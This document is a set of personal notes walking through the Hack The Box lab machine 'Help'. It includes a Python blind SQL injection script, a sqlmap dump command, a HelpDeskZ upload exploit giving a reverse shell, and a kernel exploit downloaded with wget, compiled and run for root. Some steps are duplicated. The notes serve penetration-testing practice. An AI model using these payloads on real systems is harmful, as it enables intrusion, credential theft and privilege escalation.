- 10.10.10.147 - help.htb add to /etc/hosts
- dirbuster gives help.htb/support for login
- googling helpdeskz version gave me a github link
- tried to access some files in the root folder in github and found README.md which showed the version. so searched for it in URL to find out version.
		README.md worked and it showed the version (help.htb/support/README.md) = 1.0.2
- **NEWTOOL SEARCHSPLOIT**
```
- searchsploit helpdeskz
- searchsploit -x path/to/exploit : to examine
searchsploit -m /path/to/exploit to copy exploit to working direcctory
```
- we find 2 exploit routes. (3 now)\
- nmap shows 3 ports so we check the third one (3000):
```
help.htb:3000
```
- we see a message :
- |message|"Hi Shiv, To get access please find the credentials with given query"|
- Performed dirsearch on http://help.htb:3000/
- found a lot of grapphql/ subdirectories
- checked the url : http://help.htb:3000/graphql and got the output :
- GET query missing
- Continues in **Method 1**
## Method 1: Authenticated SQLi
- search around to find graphql queiries
- username:
```
	http://help.htb:3000/graphql?query=query{user{username}}
```
- helpme@helpme.com

- password:
```
	http://help.htb:3000/graphql?query=query{user{password}}
```
- 5d3c93182bb20f07b994a7f617e99cff
- 	its 32 characters so its an MD5 hash which can be cracked (to check, echo -n 'fdsfshfsio' | wc -c)
- godhelpmeplz
- login to helpdeskz
```
searchsploit helpdeskz shows authenticated sqli
searchsploit -x /path/to/exploit
searchsploit -m /path/to/exploit
```
------
- **NOTE in burpsuite can select cookie and press Ctrl+Shift+U to URL Decode cookie**
- login the helpdesk with above credentials, turn on burpsuite and try to catch one of the image attachments in burpsuite
	10.10.10.147 - help.htb add to /etc/hosts
- dirbuster gives help.htb/support for login
- googling helpdeskz version gave me a github link
	tried to access some files in the root folder
		README.md worked and it showed the version (help.htb/support/README.md) = 1.0.2
-----
- **NEWTOOL SEARCHSPLOT**
```
searchsploit <name>
searchsploit -x path/to/exploit : to examine
searchsploit -m /path/to/exploit to copy exploit to working direcctory
```


- **NOTE in burpsuite can select cookie and press Ctrl+Shift+U to URL Decode cookie**
- login the helpdesk with above credentials, turn on burpsuite and try to catch one of the image attachments in burpsuite
	![[Pasted image 20250322164709.png]]
- also right click image attachment and copy link address:
- http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=5&param[]=10
- test for sqli
- pass and 1=1 -- with the above url i.e:
- http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=5&param[]=10 and 1=1 --
- send to repeater and send
- will show a good response
- if we add 2=1 it will return page not found so its some sort of boolean thing
- **in the helpdeskz github we see under controllers>staff>login_action.php that there is a table called staff with columns username and password. WE ALSO SEE IT USES SHA1 which is 40 characters long**
- to check admin:
- add this to url:
- and (select (username) from staff limit 0,1) = 'admin'-- -
- we get is true. although we can try other usernames to see how it acts when false
- now we try to find password and email:
- we use substr() function to loop character by character as we need to brute force the password with hex chracters [abcdef0123456789] such that when it does match it returns the character. this needs to be in a loop so we can get the full password of 40 characters (as its sha1)
- to try (this is not ideal as we dont know the first character but still) add this to url and it should return true i.e the attachment:
- and substr((select password from staff limit 0,1),1,1) = 'd'-- -
- So we need to make a script :
```
import requests
def blindInject(query):
    url = f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 {query}"
    cookies = {'PHPSESSID':'ll7c00m03d6nh99i6045migku3'}#,'usrhash':'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF/aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo+HIKS3/iW3kiF8K/Ue8Cb5I4zT2ohgObsSGs6UnIhb2aA=='}
    response = requests.get(url,cookies=cookies)
#    if "404" in response.content
#        print ("hi")
#print(blindInject("2=1"))
    rContentType = response.headers["Content-Type"]
    if rContentType == 'image/jpeg':
#        print("WOOT")
        return True
    else:
#        print("NOOB")
        return False

keyspace = 'abcdef0123456789'
for i in range(0,41):
    for c in keyspace:
        inject = f"and substr((select password from staff limit 0,1),{i},1) = '{c}'-- -"
        if blindInject(inject):
#            print(f"SUCCESS: {c}")
            print(c, end='', flush=True)

```
- SHA1 hash:Decrypted password
-  d318f44739dced66793b1a603028133a76ae680e:Welcome1
- sshinto machine, guess username
- ssh help@10.10.10.121
- enter password Welcome1
- for email, adjust script (may not work, had to fix above code in python2
```
chars = list(string.ascii_lowercase) + list(string.digits) + ['@', '_', '.']
```
- **NOTE : **
- used sqlmap (NOT ALLOWED IN OSCP)

```
sqlmap -r sqlticket2 --batch --level 5 --risk 3 -p param[] -D support -T users --dump
```
- Main output **DOESNT FIND THE PWD WE ARE LOOKING FOR**:
```
+----+-----------------------+----------+----------+------------------------------------------+------------------+------------+
| id | email                 | status   | fullname | password                                 | timezone         | salutation |
+----+-----------------------+----------+----------+------------------------------------------+------------------+------------+
| 1  | helpme@helpme.com     | 1        | helpme   | c3b3bd1eb5142e29adb0044b16ee4d402d06f9ca | Indian/Christmas | 0          |
| 2  | lolololol@yopmail.com | 1        | xcvxv    | ec09fa0d0ba74336ea7fe392869adb198242f15a | NULL             | 0          |
| 3  | zef@gmail.com         | 1        | efef     | 870fc8c6fffd0c9d0579aab96268d9e4b7595222 | NULL             | 0          |
| 4  | test@example.com      | 1        | test     | 589c9a0be20cc3dbe19586b597c87ee4344c1739 | NULL             | 0          |
+----+-----------------------+----------+----------+------------------------------------------+------------------+------------+
```
- crack pwd of sha1
- Welcome1
- need to guess username :help
- ssh into machine with creds found
## Alternate easier method
- searchsploit also reveals a file upload vulnerability so we can upload reverse shell.
- in help.htb/support we generate a ticket
- in the ticket we attach a reverse shell and have a listener running
- before uploading, we should also know the location the upload goes to.
- in the github helpdeskz v1.0.2 repo we see an uploads folder and a tickets folder inside it.
- we check via the url if it returns any page and it redirects to help.htb so we know it exists.
- we save the exploit in our folder via
```
searchsploit -m /path/to/exploit
```
- we then upload the file.
- we get a response file not found but it should be uploaded regardless
- we then pass our exploit command
```
python2 exploit.py http://help.htb/support/uploads/tickets/ Reverseshell.php
```
- **Note: Earlier we find that it doesn't work. Checking the code we see it involved checking the time and our machine time needed to match with the server clock. This is what fixed the time **:
```
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())
```
- because the code involved :
```
for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print 'found!'
        print url
        sys.exit(0)
```
- Alternatively you can also switch your machine time manually to match it.
- then passing the command while having a netcat listener should give us a reverse shell.
- we find we are user help
## Privilege Escalation
- then on enumeration we find
```
uname -a
```
- gives us kernel version which we find is old and thus vulnerable.
- we get the code from github and then start a server using python:
```
python -m http.server 80
```
- using this server, from user help we wget our exploit to that machine.
```
wget 10.10.14.25/44298.c
gcc 44298.c -o exploit
chmod +x exploit
./exploit
```
- we gain root access
